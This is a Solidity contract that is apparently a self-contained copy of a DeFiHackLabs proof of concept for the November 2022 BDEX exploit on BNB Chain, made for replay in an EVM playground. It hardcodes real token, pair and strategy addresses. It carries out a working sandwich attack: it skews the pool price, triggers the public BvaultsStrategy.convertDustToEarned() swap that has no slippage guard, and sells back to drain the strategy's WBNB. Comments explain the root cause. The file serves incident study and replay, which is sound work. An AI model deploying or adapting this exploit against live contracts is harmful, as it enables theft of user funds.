// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-11-BDEX).
// The DeFiHackLabs PoC (test/BDEX_exp.sol) runs the attack INLINE in the Foundry
// `ContractTest is Test` contract — there is no standalone contract to deploy.
// This file is a faithful, self-contained copy of that inline attack so the
// playground can deploy it and record run(). Logic, constants, and the exact
// 998/1000 fee formula are copied verbatim from test/BDEX_exp.sol (testExploit).
//
// Root cause: BvaultsStrategy.convertDustToEarned() is PUBLIC and un-permissioned
// and performs its WBNB→BDEX dust swap with amountOutMin = 1 (no slippage guard).
// An attacker sandwiches that swap: skew the BDEX/WBNB pair price first, trigger
// the strategy's bad-priced swap, then sell back into the now WBNB-rich pool,
// extracting the strategy's WBNB dust (~16.22 WBNB).

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface IWBNB {
    function deposit() external payable;
    function withdraw(uint256) external;
}

interface IBPair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);
}

interface IBvaultsStrategy {
    function convertDustToEarned() external;
}

contract BDEXSandwich {
    // --- addresses (BSC) ---
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant BDEX = 0x7E0F01918D92b2750bbb18fcebeEDD5B94ebB867;
    address constant PAIR = 0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D; // BDEX/WBNB BdexPair
    address constant STRATEGY = 0xB2B1DC3204ee8899d6575F419e72B53E370F6B20; // BvaultsStrategy

    // --- constants copied verbatim from test/BDEX_exp.sol ---
    uint256 constant BUY_WBNB = 34 ether; // 34 WBNB used to skew the pool

    IERC20 constant wbnb = IERC20(WBNB);
    IERC20 constant bdex = IERC20(BDEX);
    IWBNB constant wbnbNative = IWBNB(WBNB);
    IBPair constant pair = IBPair(PAIR);
    IBvaultsStrategy constant strategy = IBvaultsStrategy(STRATEGY);

    function run() external payable {
        // step 1: wrap 34 BNB -> WBNB, send to the pair, swap out BDEX to skew price up.
        wbnbNative.deposit{value: BUY_WBNB}();
        uint256 amountIn = wbnb.balanceOf(address(this));
        wbnb.transfer(PAIR, amountIn);
        (uint256 bdexReserve, uint256 wbnbReserve,) = pair.getReserves();
        // BdexPair swap fee = 0.2% → 998/1000 formula (copied from the PoC).
        uint256 amountOut = (998 * amountIn * bdexReserve) / (1000 * wbnbReserve + 998 * amountIn);
        pair.swap(amountOut, 0, address(this), "");

        // step 2: the victim swap — anyone may fire the strategy's WBNB dust -> BDEX
        // conversion. It buys BDEX HIGH at the attacker-skewed price with minOut = 1.
        strategy.convertDustToEarned();

        // step 3: sell the BDEX back into the now WBNB-rich pool, draining WBNB.
        uint256 amountBDEX = bdex.balanceOf(address(this));
        bdex.transfer(PAIR, amountBDEX);
        (uint256 bdexReserve1, uint256 wbnbReserve1,) = pair.getReserves();
        uint256 amountWBNB = (998 * amountBDEX * wbnbReserve1) / (1000 * bdexReserve1 + 998 * amountBDEX);
        pair.swap(0, amountWBNB, address(this), "");

        // step 4: unwrap the 34 WBNB back to native (recovers working capital).
        wbnbNative.withdraw(BUY_WBNB);
    }

    receive() external payable {}
}
